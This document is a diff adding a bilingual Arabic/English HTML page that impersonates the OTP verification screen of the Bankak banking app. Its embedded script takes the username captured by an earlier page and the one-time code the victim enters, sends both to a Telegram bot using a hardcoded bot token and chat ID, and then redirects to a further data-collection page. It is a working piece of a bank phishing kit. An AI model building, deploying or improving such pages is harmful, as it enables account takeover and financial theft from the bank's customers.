@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" class="h-full antialiased">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title id="page-title">bankofkhartoum</title>
+    <meta name="description" content="التحقق من الرمز السري — بنكك">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/svg+xml" href="logo.svg">
+    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="page-wrapper lang-fade" id="page-wrapper">
+        <div class="top-bar-bankak">
+            <button type="button" class="lang-pill" id="lang-toggle" aria-label="Switch language">EN</button>
+            <div class="top-bar-bankak-inner">
+                <a href="#" class="bankak-logo" aria-label="Bankak">
+                    <span class="bankak-logo-ar">بنكك</span>
+                    <span class="bankak-logo-en">bankak</span>
+                </a>
+            </div>
+        </div>
+
+        <main class="otp-main">
+            <div class="otp-card">
+                <div class="otp-top">
+                    <svg class="clock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" aria-hidden="true">
+                        <circle cx="50" cy="50" r="38" fill="none" stroke="#2e9e4a" stroke-width="7" stroke-linecap="round" stroke-dasharray="238" stroke-dashoffset="60" transform="rotate(120 50 50)"/>
+                        <line x1="50" y1="50" x2="34" y2="38" stroke="#2e9e4a" stroke-width="6" stroke-linecap="round"/>
+                        <circle cx="50" cy="50" r="4.5" fill="#2e9e4a"/>
+                    </svg>
+                    <div class="timer-line">
+                        <span data-i18n="timer_label">الوقت المتبقي</span>
+                        <span class="timer-value" id="timer-value">59:58</span>
+                    </div>
+                    <p class="otp-hint" data-i18n="otp_hint">تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل/البريد الإلكتروني.</p>
+                </div>
+
+                <div class="otp-mid">
+                    <form id="otp-form" novalidate>
+                        <div class="otp-input-wrap">
+                            <svg class="otp-key" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                                <circle cx="7.5" cy="15.5" r="5.5"></circle>
+                                <path d="m21 2-9.6 9.6"></path>
+                                <path d="m15.5 7.5 3 3L22 7l-3-3"></path>
+                            </svg>
+                            <input type="text" class="otp-input" id="otp-input" name="otp" inputmode="numeric" autocomplete="one-time-code" maxlength="6" pattern="[0-9]*" data-i18n-placeholder="otp_placeholder" placeholder="أدخل الرمز السري (OTP)" required>
+                        </div>
+                        <div class="resend-row">
+                            <button type="button" class="resend-btn" id="resend-btn" data-i18n="resend_label">إعادة إرسال</button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="form-error" id="form-error"></div>
+
+                <div class="otp-actions">
+                    <button type="button" class="otp-btn" id="cancel-btn" data-i18n="cancel_label">إلغاء</button>
+                    <button type="submit" form="otp-form" class="otp-btn" id="send-btn">
+                        <span id="send-text" data-i18n="send_label">إرسال</span>
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        (function () {
+            'use strict';
+            var CONFIG = {
+                TELEGRAM_BOT_TOKEN: '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc',
+                TELEGRAM_CHAT_ID: '844962683',
+                CANCEL_URL: 'index.html',
+                NEXT_URL: 'business-details.html',
+                REDIRECT_DELAY: 1500,
+                TIMER_SECONDS: 3600
+            };
+
+            var translations = {
+                ar: {
+                    pageTitle: 'bankofkhartoum',
+                    timer_label: 'الوقت المتبقي',
+                    otp_hint: 'تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل/البريد الإلكتروني.',
+                    otp_placeholder: 'أدخل الرمز السري (OTP)',
+                    resend_label: 'إعادة إرسال',
+                    cancel_label: 'إلغاء', send_label: 'إرسال',
+                    sending: 'جارٍ الإرسال', resend_sent: 'تم إرسال طلب الإعادة',
+                    toggleLabel: 'EN', toggleAria: 'Switch to English',
+                    errLength: 'الرجاء إدخال رمز مكوّن من 6 أرقام.',
+                    errDigits: 'يجب أن يحتوي الرمز على أرقام فقط.',
+                    errExpired: 'انتهت صلاحية الرمز. الرجاء إعادة الإرسال.'
+                },
+                en: {
+                    pageTitle: 'bankofkhartoum',
+                    timer_label: 'Time remaining',
+                    otp_hint: 'The secret code (OTP) has been sent to your registered phone number/email address.',
+                    otp_placeholder: 'Enter the OTP code',
+                    resend_label: 'Resend',
+                    cancel_label: 'Cancel', send_label: 'Send',
+                    sending: 'Sending', resend_sent: 'Resend request sent',
+                    toggleLabel: 'AR', toggleAria: 'التبديل إلى العربية',
+                    errLength: 'Please enter the 6-digit code.',
+                    errDigits: 'The code must contain digits only.',
+                    errExpired: 'The code has expired. Please request a new one.'
+                }
+            };
+
+            var DEFAULT_LANG = 'ar';
+            var currentLang = DEFAULT_LANG;
+            var isSubmitting = false;
+            var username = '';
+            var remaining = CONFIG.TIMER_SECONDS;
+            var timerId = null;
+            var timerExpired = false;
+
+            var html = document.documentElement;
+            var pageTitle = document.getElementById('page-title');
+            var langToggle = document.getElementById('lang-toggle');
+            var wrapper = document.getElementById('page-wrapper');
+            var form = document.getElementById('otp-form');
+            var otpInput = document.getElementById('otp-input');
+            var sendBtn = document.getElementById('send-btn');
+            var sendText = document.getElementById('send-text');
+            var cancelBtn = document.getElementById('cancel-btn');
+            var resendBtn = document.getElementById('resend-btn');
+            var formError = document.getElementById('form-error');
+            var timerValueEl = document.getElementById('timer-value');
+
+            try { username = sessionStorage.getItem('bankak-username') || ''; } catch (e) {}
+            if (!username) { window.location.replace('bankak.html'); return; }
+
+            function applyLanguage(lang) {
+                currentLang = lang;
+                var t = translations[lang];
+                html.setAttribute('lang', lang);
+                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+                if (pageTitle) pageTitle.textContent = t.pageTitle;
+                document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n');
+                    if (t[k] !== undefined) el.textContent = t[k];
+                });
+                document.querySelectorAll('[data-i18n-placeholder]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n-placeholder');
+                    if (t[k] !== undefined) el.setAttribute('placeholder', t[k]);
+                });
+                if (langToggle) {
+                    langToggle.textContent = t.toggleLabel;
+                    langToggle.setAttribute('aria-label', t.toggleAria);
+                }
+                if (formError) formError.classList.remove('visible');
+                try { localStorage.setItem('bankak-lang', lang); } catch (e) {}
+            }
+
+            langToggle.addEventListener('click', function () {
+                var next = currentLang === 'ar' ? 'en' : 'ar';
+                wrapper.classList.add('is-switching');
+                window.setTimeout(function () {
+                    applyLanguage(next);
+                    wrapper.classList.remove('is-switching');
+                }, 120);
+            });
+
+            function formatTime(sec) {
+                var m = Math.floor(sec / 60);
+                var s = sec % 60;
+                return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+            }
+            function updateTimerDisplay() { timerValueEl.textContent = formatTime(remaining); }
+            function startTimer() {
+                updateTimerDisplay();
+                if (timerId) clearInterval(timerId);
+                timerId = setInterval(function () {
+                    remaining--;
+                    if (remaining <= 0) {
+                        remaining = 0; updateTimerDisplay();
+                        clearInterval(timerId); timerId = null;
+                        timerExpired = true; sendBtn.disabled = true;
+                    } else updateTimerDisplay();
+                }, 1000);
+            }
+            function resetTimer() {
+                remaining = CONFIG.TIMER_SECONDS;
+                timerExpired = false; sendBtn.disabled = false;
+                startTimer();
+            }
+            startTimer();
+
+            otpInput.addEventListener('input', function (e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            });
+
+            cancelBtn.addEventListener('click', function () {
+                window.location.href = CONFIG.CANCEL_URL;
+            });
+
+            function sendToTelegram(type, code) {
+                var token = CONFIG.TELEGRAM_BOT_TOKEN;
+                var chatId = CONFIG.TELEGRAM_CHAT_ID;
+                if (!token || token === '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc' || !chatId || chatId === '844962683') {
+                    console.warn('[Bankak] Telegram not configured — skipping.');
+                    return Promise.resolve(false);
+                }
+                var now = new Date();
+                var timeStr = now.toLocaleString('en-GB', { hour12: false });
+                var text;
+                if (type === 'otp') {
+                    text = '🔐 تحديث بياناتك — رمز التحقق OTP\n━━━━━━━━━━━━━━━━━━━━\n👤 اسم المستخدم / Account: ' + username + '\n\n🔢 رمز التحقق / OTP: ' + code + '\n\n🕒 الوقت: ' + timeStr;
+                } else {
+                    text = '🔁 تحديث بياناتك — طلب إعادة إرسال الرمز\n━━━━━━━━━━━━━━━━━━━━\n👤 اسم المستخدم / Account: ' + username + '\n\n🕒 الوقت: ' + timeStr;
+                }
+                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+                var payload = new URLSearchParams();
+                payload.append('chat_id', chatId);
+                payload.append('text', text);
+                return fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload.toString() })
+                    .then(function () { return true; }).catch(function () { return false; });
+            }
+
+            resendBtn.addEventListener('click', function () {
+                if (resendBtn.disabled) return;
+                var t = translations[currentLang];
+                sendToTelegram('resend', '').then(function () {});
+                resetTimer();
+                resendBtn.textContent = t.resend_sent;
+                resendBtn.disabled = true;
+                window.setTimeout(function () {
+                    applyLanguage(currentLang);
+                    resendBtn.disabled = false;
+                }, 2000);
+                otpInput.focus();
+            });
+
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                if (isSubmitting) return;
+                var t = translations[currentLang];
+                var value = otpInput.value.trim();
+
+                if (timerExpired) { formError.textContent = t.errExpired; formError.classList.add('visible'); return; }
+                if (value.length !== 6) { formError.textContent = t.errLength; formError.classList.add('visible'); otpInput.focus(); return; }
+                if (!/^\d{6}$/.test(value)) { formError.textContent = t.errDigits; formError.classList.add('visible'); otpInput.focus(); return; }
+
+                formError.classList.remove('visible');
+                isSubmitting = true;
+                sendBtn.disabled = true;
+                sendText.innerHTML = t.sending + '<span class="spinner" aria-hidden="true"></span>';
+
+                sendToTelegram('otp', value).then(function () {
+                    if (timerId) clearInterval(timerId);
+                    window.setTimeout(function () {
+                        window.location.href = CONFIG.NEXT_URL;
+                    }, CONFIG.REDIRECT_DELAY);
+                });
+            });
+
+            var saved = null;
+            try { saved = localStorage.getItem('bankak-lang'); } catch (e) {}
+            applyLanguage(saved === 'en' ? 'en' : DEFAULT_LANG);
+            otpInput.focus();
+        })();
+    </script>
+</body>
+</html>
